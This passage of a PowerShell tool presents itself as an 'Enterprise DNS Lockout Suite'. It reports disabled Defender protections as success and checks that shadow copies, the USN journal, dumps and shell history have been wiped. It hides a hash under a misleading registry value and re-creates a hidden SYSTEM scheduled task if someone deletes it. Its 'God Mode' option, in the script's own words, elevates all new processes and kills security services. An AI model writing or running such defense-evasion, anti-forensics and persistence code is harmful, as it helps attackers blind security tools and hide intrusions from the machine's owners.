    } catch { Write-Host "  ASR Rules               : UNKNOWN" -ForegroundColor DarkGray }

    # Controlled Folder Access
    try {
        $Cfa = Get-MpPreference -ErrorAction SilentlyContinue
        if ($Cfa -and $Cfa.EnableControlledFolderAccess -eq 'Disabled') {
            Write-Host "  Controlled Folder Access: DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  Controlled Folder Access: ENABLED" -ForegroundColor Red
        }
    } catch { Write-Host "  Controlled Folder Access: UNKNOWN" -ForegroundColor DarkGray }

    # Exploit Guard / Network Protection
    try {
        $Np = Get-MpPreference -ErrorAction SilentlyContinue
        if ($Np -and ($Np.EnableNetworkProtection -eq 'AuditMode' -or $Np.EnableNetworkProtection -eq 0)) {
            Write-Host "  Exploit Guard / NetProt : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  Exploit Guard / NetProt : ENABLED" -ForegroundColor Red
        }
    } catch { Write-Host "  Exploit Guard / NetProt : UNKNOWN" -ForegroundColor DarkGray }

    # Anti-Forensics
    try {
        $Shadows = (& vssadmin list shadows 2>$null) | Out-String
        $ShadowsCleared = ($Shadows -notmatch "Shadow Copy")
        $UsnCleared = $false
        try { $Usn = (& fsutil usn queryjournal C: 2>$null); if (-not $Usn) { $UsnCleared = $true } } catch { $UsnCleared = $true }
        $DumpsExist = (Test-Path "C:\Windows\Minidump\*") -or (Test-Path "C:\Windows\Memory.dmp")
        $HistPath = $null
        try { $HistPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath } catch {}
        $HistoryExists = $HistPath -and (Test-Path $HistPath)
        $RecentExists = (Test-Path "$env:APPDATA\Microsoft\Windows\Recent\*")
        if ($ShadowsCleared -and $UsnCleared -and -not $DumpsExist -and -not $HistoryExists -and -not $RecentExists) {
            Write-Host "  Anti-Forensics          : CLEARED (Shadows, USN, Dumps, History, Recent)" -ForegroundColor Green
        } else {
            $AFParts = @()
            if (-not $ShadowsCleared) { $AFParts += "Shadows" }
            if (-not $UsnCleared) { $AFParts += "USN" }
            if ($DumpsExist) { $AFParts += "Dumps" }
            if ($HistoryExists) { $AFParts += "History" }
            if ($RecentExists) { $AFParts += "Recent" }
            Write-Host "  Anti-Forensics          : PARTIAL (present: $($AFParts -join ', '))" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "  Anti-Forensics          : UNKNOWN" -ForegroundColor DarkGray
    }

    # Registry ACL Hardening (representative check)
    try {
        $RepKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        $HasDeny = $false
        if (Test-Path $RepKey) {
            $Acl = Get-Acl -Path $RepKey -ErrorAction SilentlyContinue
            if ($Acl) {
                foreach ($Rule in $Acl.Access) {
                    if ($Rule.AccessControlType -eq 'Deny' -and ($Rule.IdentityReference.Value -match 'Administrators|Everyone|Authenticated Users')) {
                        $HasDeny = $true
                        break
                    }
                }
            }
        }
        if ($HasDeny) {
            Write-Host "  Registry ACL Hardening  : ACTIVE (Deny rules present)" -ForegroundColor Green
        } else {
            Write-Host "  Registry ACL Hardening  : INACTIVE" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Registry ACL Hardening  : UNKNOWN" -ForegroundColor DarkGray
    }

    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
}

function Get-QuickDNSLockStatus {
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    $SidAdmin = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )
        foreach ($SubKeyPath in $SubKeyPaths) {
            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadSubTree, [System.Security.AccessControl.RegistryRights]::ReadPermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            if (($RuleSid.Value -eq $SidAdmin.Value) -and $Rule.AccessControlType -eq "Deny") { return $true }
                        } catch {}
                    }
                    $RegKey.Close()
                }
            } catch {}
        }
    }
    return $false
}

# ============================================================================
# 8. CLI EXECUTION HANDLER
# ============================================================================

# Handle CLI Flags
if ($SilentLock) {
    # Self-integrity check: verify the installed script has not been tampered with
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    $IntegrityFile = Join-Path $InstallDir "integrity.sha256"
    $HashCheckPassed = $true

    # Primary check: registry stored hash (misleading key name)
    $ExpectedHash = $null
    try { $ExpectedHash = (Get-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -ErrorAction Stop).PushConfigBackoffInterval } catch {}

    if ($ExpectedHash) {
        $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
        if ($ExpectedHash.Trim() -ne $ActualHash.Trim()) {
            Write-Log -Message "INTEGRITY FAILURE: Registry hash mismatch! Expected: $ExpectedHash  Actual: $ActualHash" -Type "SECURITY" -Color Red
            $HashCheckPassed = $false
        }
    } elseif (Test-Path $IntegrityFile) {
        # Fallback to file hash if registry key is missing
        $ExpectedHash = Get-Content -Path $IntegrityFile -Raw
        $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
        if ($ExpectedHash.Trim() -ne $ActualHash.Trim()) {
            Write-Log -Message "INTEGRITY FAILURE: File hash mismatch! Expected: $ExpectedHash  Actual: $ActualHash" -Type "SECURITY" -Color Red
            $HashCheckPassed = $false
        }
    }

    if (-not $HashCheckPassed) {
        Enable-DNSLock
        Exit
    }

    # Guardian: ensure main task still exists and recreate it if deleted
    $MainTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if (-not $MainTask) {
        Write-Log -Message "Main task '$TaskName' is missing! Recreating from guardian..." -Type "SECURITY" -Color Red
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
        $Trigger1 = New-ScheduledTaskTrigger -AtStartup
        $Trigger2 = New-ScheduledTaskTrigger -AtLogOn
        $CimClass = Get-CimClass -ClassName MSFT_TaskEventTrigger -Namespace "Root/Microsoft/Windows/TaskScheduler"
        $Trigger3 = New-CimInstance -CimClass $CimClass -ClientOnly
        $Trigger3.Subscription = "<QueryList><Query Id='0' Path='Microsoft-Windows-NetworkProfile/Operational'><Select Path='Microsoft-Windows-NetworkProfile/Operational'>*[System[EventID=10000]]</Select></Query></QueryList>"
        $Trigger3.Enabled = $True
        $PrincipalSettings = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2, $Trigger3) -Principal $PrincipalSettings -Force | Out-Null
    }

    Enable-DNSLock
    Exit
}
if ($Lock)       { Enable-DNSLock; Exit }
if ($Unlock)     { Disable-DNSLock; Exit }
if ($Install)    { Install-Persistence; Exit }
if ($Uninstall) {
    $CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    $CurrentUserSid = [Security.Principal.WindowsIdentity]::GetCurrent().User
    if ($CurrentUserSid.Value -ne "S-1-5-18") {
        Write-Host "[SECURITY] CLI Uninstall denied: Must run as SYSTEM. Current user: $CurrentUser" -ForegroundColor Red
        Write-Host "Run from a SYSTEM shell (e.g., psexec -s powershell.exe -File `"$InstallScript`" -Uninstall)" -ForegroundColor Yellow
        Exit
    }
    Uninstall-Persistence
    Exit
}

# God Mode CLI Handlers
if ($ToggleOn) {
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        Exit 1
    }
    Enable-GodMode; Exit
}
if ($ToggleOff) {
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        Exit 1
    }
    Disable-GodMode; Exit
}
if ($GodModeStatus) { Show-GodModeStatus; Exit }
if ($Launch) {
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        Exit 1
    }
    Start-Monitoring; Exit
}
if ($InstallGodMode) {
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can install God Mode.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        Exit 1
    }
    Install-GodModePersistence; Exit
}
if ($UninstallGodMode) {
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can uninstall God Mode.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        Exit 1
    }
    Uninstall-GodModePersistence; Exit
}
if ($DumpLogs) {
    Export-GodModeLogs
    Exit
}

# If no flags are passed, load the Interactive Menu
do {
    Clear-Host
    Write-Host "=====================================================" -ForegroundColor Cyan
    Write-Host "   ENTERPRISE DNS LOCKOUT SUITE (INSTALLER EDITION)  " -ForegroundColor Cyan
    Write-Host "=====================================================" -ForegroundColor Cyan

    # Quick system status header
    $QuickGodMode = if ((Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue).$GodModeFlagRegName -eq 1) { "ACTIVE" } else { "INACTIVE" }
    $QuickGodModeColor = if ((Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue).$GodModeFlagRegName -eq 1) { "Red" } else { "Green" }
    $QuickDNS = Get-QuickDNSLockStatus
    $QuickDNSText = if ($QuickDNS) { "LOCKED" } else { "UNLOCKED" }
    $QuickDNSColor = if ($QuickDNS) { "Red" } else { "Green" }
    $QuickIntegrity = Test-IntegrityStatus
    $QuickIntColor = "DarkGray"; $QuickIntText = "N/A"
    if ($QuickIntegrity -eq $true) { $QuickIntColor = "Green"; $QuickIntText = "VERIFIED" }
    if ($QuickIntegrity -eq $false) { $QuickIntColor = "Red"; $QuickIntText = "TAMPERED" }
    $QuickAdmin = if (Test-BuiltInAdmin) { "YES" } else { "NO" }
    $QuickAdminColor = if (Test-BuiltInAdmin) { "Green" } else { "Yellow" }
    Write-Host "  God Mode: " -NoNewline -ForegroundColor DarkGray
    Write-Host $QuickGodMode -NoNewline -ForegroundColor $QuickGodModeColor
    Write-Host "  |  DNS Lock: " -NoNewline -ForegroundColor DarkGray
    Write-Host $QuickDNSText -NoNewline -ForegroundColor $QuickDNSColor
    Write-Host "  |  Integrity: " -NoNewline -ForegroundColor DarkGray
    Write-Host $QuickIntText -NoNewline -ForegroundColor $QuickIntColor
    Write-Host "  |  Built-in Admin: " -NoNewline -ForegroundColor DarkGray
    Write-Host $QuickAdmin -ForegroundColor $QuickAdminColor
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    Write-Host "`n-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  DNS PROTECTION    " -ForegroundColor Cyan
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[1] DEPLOY LOCK (Secure All Active Adapters)" -ForegroundColor Cyan
    Write-Host "[2] REMOVE LOCK (Ångra / Restore Access)" -ForegroundColor Yellow
    if (-not (Test-Path $InstallDir)) {
        Write-Host "[3] INSTALL SERVICE (Auto-Heal & Create 'dnslock' command)" -ForegroundColor Green
    }
    Write-Host "[4] UNINSTALL SERVICE (Remove background tasks & Unlock)" -ForegroundColor Red
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  SYSTEM            " -ForegroundColor White
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[5] REFRESH SYSTEM STATUS" -ForegroundColor Gray
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  GOD MODE (DANGEROUS)  " -ForegroundColor Magenta
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    if (-not (Test-Path $GodModeInstallDir)) {
        Write-Host "[6] INSTALL GOD MODE SERVICE (Auto-Enable & Create 'godmode' CLI)" -ForegroundColor Green
    } else {
        Write-Host "[6] UNINSTALL GOD MODE SERVICE (Remove background tasks)" -ForegroundColor Red
    }
    Write-Host "[7] ENABLE GOD MODE (Built-in Admin Only)" -ForegroundColor Magenta
    Write-Host "[8] DISABLE GOD MODE (Built-in Admin Only)" -ForegroundColor DarkMagenta
    Write-Host "[9] CHECK GOD MODE STATUS" -ForegroundColor Gray
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[10] LAUNCH GOD MODE MONITOR (Built-in Admin Only)" -ForegroundColor Magenta
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  SESSION           " -ForegroundColor White
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[11] DUMP LOGS TO DESKTOP" -ForegroundColor Cyan
    Write-Host "[12] EXIT TERMINAL" -ForegroundColor Gray
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[13] VERIFY SYSTEM CONTEXT" -ForegroundColor Cyan
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    $Choice = Read-Host "Select an administrative action (1-13)"
    $IntegrityStatus = Test-IntegrityStatus

    switch ($Choice) {
        "1" {
            if ($IntegrityStatus -eq $false) {
                Write-Host "`n[BLOCKED] Option [1] is disabled because the script has been tampered with." -ForegroundColor Red -BackgroundColor Black
                Write-Host "Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
            } else {
                Enable-DNSLock
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "2" {
            if ($IntegrityStatus -eq $false) {
                Write-Host "`n[BLOCKED] Option [2] is disabled because the script has been tampered with." -ForegroundColor Red -BackgroundColor Black
                Write-Host "Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
            } else {
                Disable-DNSLock
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "3" {
            if ($IntegrityStatus -eq $false) {
                Write-Host "`n[BLOCKED] Option [3] is disabled because the script has been tampered with." -ForegroundColor Red -BackgroundColor Black
                Write-Host "Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
            } elseif (Test-Path $InstallDir) {
                Write-Warning "DNS-Guard is already installed. Option [3] is unavailable."
            } else {
                Install-Persistence
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "4" { Uninstall-Persistence; Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") }
        "5" {
            Show-GodModeStatus
            Get-DNSLockStatus | Out-Null
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "6" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                if (-not (Test-Path $GodModeInstallDir)) {
                    Install-GodModePersistence
                    Write-Host "God Mode service installed." -ForegroundColor Green
                } else {
                    Uninstall-GodModePersistence
                    Write-Host "God Mode service uninstalled." -ForegroundColor Yellow
                }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "7" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                Enable-GodMode
                Write-Host "God Mode enabled." -ForegroundColor Green
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "8" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                Disable-GodMode
                Write-Host "God Mode disabled." -ForegroundColor Yellow
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "9" { Show-GodModeStatus; Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") }
        "13" { Test-SystemContext; Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") }
        "10" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can launch the God Mode Monitor.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                Write-Host "`n[WARNING] Launching God Mode Monitor will start a persistent loop that elevates" -ForegroundColor Yellow
                Write-Host "          all new processes and kills security services. This is IRREVERSIBLE" -ForegroundColor Yellow
                Write-Host "          without closing the PowerShell process or rebooting." -ForegroundColor Yellow
                $confirm = Read-Host "Type 'YES' to launch the monitor"
                if ($confirm -eq 'YES') {
                    Start-Monitoring
                } else {
                    Write-Host "Launch cancelled." -ForegroundColor Green
                }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "11" { Export-GodModeLogs; Start-Sleep -Seconds 2 }
        "12" { Write-Host "Exiting..." -ForegroundColor DarkGray; Start-Sleep -Milliseconds 500; break }
        default { Write-Warning "Invalid Selection."; Start-Sleep -Seconds 1 }
    }
} while ($Choice -ne "12")
